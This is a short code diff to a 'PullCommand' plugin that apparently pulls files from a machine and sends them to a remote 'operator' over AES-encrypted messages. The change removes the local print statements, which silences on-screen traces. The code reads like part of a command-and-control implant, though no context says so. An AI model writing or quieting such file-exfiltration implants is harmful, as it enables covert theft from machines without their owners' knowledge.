@@ -108,8 +108,6 @@ class PullCommand(CommandPlugin):
         targetPath = str(p.resolve())
         # make sure path points to an existing file
         if os.path.isdir(targetPath) or not p.exists():
-            print(os.getcwd())
-            print("target path does not exist or is a directory")
             # send error message to operator and terminate command
             cipher = AES.new(cipherKey, AES.MODE_EAX)
             nonce = cipher.nonce
@@ -133,7 +131,8 @@ class PullCommand(CommandPlugin):
         cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
         signal = cipher.decrypt(ciphertext)
         if signal.decode() != "READY":
-            print("ready signal garbled in transit")
+            # ready signal garbled in transit
+            pass
         # send file
         with open(targetPath, "rb") as pullFile:
             while True:
